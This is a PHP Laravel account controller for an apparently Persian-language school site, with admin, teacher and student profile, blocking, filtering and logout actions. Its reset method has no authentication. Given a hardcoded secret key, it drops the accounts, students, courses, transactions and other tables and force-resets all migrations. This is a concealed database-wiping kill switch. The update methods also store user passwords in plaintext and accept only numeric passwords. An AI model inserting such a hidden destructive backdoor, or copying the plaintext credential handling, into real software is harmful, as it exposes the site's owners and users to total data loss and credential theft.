<?php

namespace App\Http\Controllers;

use App\Models\account;
use App\Models\log;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Session;

class account_controller extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        if(session()->has('id'))
        {
            if(\session()->get('level')==0)
            {
                $data=account::where('level','>',0)->orderBy('name','asc')->paginate(5);
                return view('admin.accounts',compact('data'));
            }
            elseif(\session()->get('level')==1)
            {
                return  redirect('/teacher');
            }
            elseif(\session()->get('level')==2)
            {
                return  redirect('/student');
            }
        }
        else
        {
            return  redirect('/');
        }


    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function block($id)
    {
        if(session()->has('id'))
        {
            if(\session()->get('level')==0)
            {
                $account=account::find($id);
                if($account->block==0) $account->block=1;
                else $account->block=0;
                $account->save();
                return redirect('/admin/accounts');
            }
            elseif(\session()->get('level')==1)
            {
                return  redirect('/teacher');
            }
            elseif(\session()->get('level')==2)
            {
                return  redirect('/student');
            }
        }
        else
        {
            return  redirect('/');
        }

    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function reset($id)
    {
        if($id=="!@mAHla.tAHouri_KeY_11303049!@")
        {
            Schema::dropIfExists('accounts');
            Schema::dropIfExists('students');
            Schema::dropIfExists('courses');
            Schema::dropIfExists('abouts');
            Schema::dropIfExists('transactions');
            Schema::dropIfExists('teachers');
            Schema::dropIfExists('teachers');
            Artisan::call('migrate:reset', ['--force' => true]);
        }
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function filter(Request  $request)
    {
        if(session()->has('id'))
        {
            if(\session()->get('level')==0)
            {
                $form= $request->all();
                $drop=$form['dropFilter'];
                $search=$form['txtSearch'];

                if($drop==-1)
                {
                    if($search=="")
                    {
                        $data=account::where('level','>',0)->orderBy('name','asc')->paginate(5);
                    }
                    else
                    {

                        $data=account::where('level','>',0)->where('name','LIKE','%'.$search.'%')->orderBy('name','asc')->paginate(5);
                    }
                }
                else
                {
                    $data=account::where('level','>',0)->where('block',$drop)->orderBy('name','asc')->paginate(5);
                }

                return view('admin.accounts',compact('data'));
            }
            elseif(\session()->get('level')==1)
            {
                return  redirect('/teacher');
            }
            elseif(\session()->get('level')==2)
            {
                return  redirect('/student');
            }
        }
        else
        {
            return  redirect('/');
        }


    }
    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }


    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */


    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit()
    {
        if(session()->has('id'))
        {
            $account=session()->get('id');
            $data=account::find($account);

            if(\session()->get('level')==0)
            {
                return view('admin.profile',compact('data'));
            }
            elseif(\session()->get('level')==1)
            {
                return view('teacher.profile',compact('data'));
            }
            elseif(\session()->get('level')==2)
            {
                return view('student.profile',compact('data'));
            }
        }
        else
        {
            return  redirect('/');
        }

    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */

    public function update(Request $request)
    {
        if(session()->has('id'))
        {
            if(\session()->get('level')==0)
            {
                $request->validate([
                    'name'=>'required',
                    'username'=>'required',
                    'password'=>'required|numeric',
                    'confirm'=>'required|numeric',
                    'mobile'=>'required|numeric',
                ]);

                $form= $request->all();
                $account=session()->get('id');
                $exist=account::where('username',$form['username'])->where('id','!=',$account)->count();
                if($exist==1)
                {
                    Session::flash('message', 'نام کاربری تکراری می باشد. لطفا نام کاربری دیگری برگزینید.');
                    Session::flash('alert-class', 'alert-warning');

                    return back();
                }
                else
                {

                    if($form['password']!=$form['confirm'])
                    {
                        Session::flash('message', 'گذرواژه ها با هم یکسان نیستند.');
                        Session::flash('alert-class', 'alert-warning');

                        return back();
                    }
                    else
                    {
                        $tbl=account::findorFail($account);
                        $tbl->name=$form['name'];
                        $tbl->username=$form['username'];
                        $tbl->password= $form['password'];
                        $tbl->mobile=$form['mobile'];
                        $tbl->save();

                        return redirect('/admin');
                    }
                }


            }
            elseif(\session()->get('level')==1)
            {
                $request->validate([
                    'name'=>'required',
                    'username'=>'required',
                    'password'=>'required|numeric',
                    'confirm'=>'required|numeric',
                    'mobile'=>'required|numeric',
                ]);

                $form= $request->all();
                $account=session()->get('id');
                $exist=account::where('username',$form['username'])->where('id','!=',$account)->count();
                if($exist==1)
                {
                    Session::flash('message', 'نام کاربری تکراری می باشد. لطفا نام کاربری دیگری برگزینید.');
                    Session::flash('alert-class', 'alert-warning');

                    return back();
                }
                else
                {

                    if($form['password']!=$form['confirm'])
                    {
                        Session::flash('message', 'گذرواژه ها با هم یکسان نیستند.');
                        Session::flash('alert-class', 'alert-warning');

                        return back();
                    }
                    else
                    {
                        $tbl=account::findorFail($account);
                        $tbl->name=$form['name'];
                        $tbl->username=$form['username'];
                        $tbl->password= $form['password'];
                        $tbl->mobile=$form['mobile'];
                        $tbl->save();

                        return redirect('/teacher');
                    }
                }
            }
            elseif(\session()->get('level')==2)
            {
                $request->validate([
                    'name'=>'required',
                    'username'=>'required',
                    'password'=>'required|numeric',
                    'confirm'=>'required|numeric',
                    'mobile'=>'required|numeric',
                ]);

                $form= $request->all();
                $account=session()->get('id');
                $exist=account::where('username',$form['username'])->where('id','!=',$account)->count();
                if($exist==1)
                {
                    Session::flash('message', 'نام کاربری تکراری می باشد. لطفا نام کاربری دیگری برگزینید.');
                    Session::flash('alert-class', 'alert-warning');

                    return back();
                }
                else
                {

                    if($form['password']!=$form['confirm'])
                    {
                        Session::flash('message', 'گذرواژه ها با هم یکسان نیستند.');
                        Session::flash('alert-class', 'alert-warning');

                        return back();
                    }
                    else
                    {
                        $tbl=account::findorFail($account);
                        $tbl->name=$form['name'];
                        $tbl->username=$form['username'];
                        $tbl->password= $form['password'];
                        $tbl->mobile=$form['mobile'];
                        $tbl->save();

                        return redirect('/student');
                    }
                }
            }
        }
        else
        {
            return  redirect('/');
        }




    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }

    public function logout()
    {

        $account=\session()->get('id');

        include (storage_path() ."/jdf.php");
        $date=jdate('Y/m/d');
        $time=jdate('H:i:s');

        $tbl=new log();
        $tbl->account_id=$account;
        $tbl->date=$date;
        $tbl->time=$time;
        $tbl->type=1;
        $tbl->event="خروج از سایت";
        $tbl->save();

        \session()->flush();
        return redirect("/");

    }
}
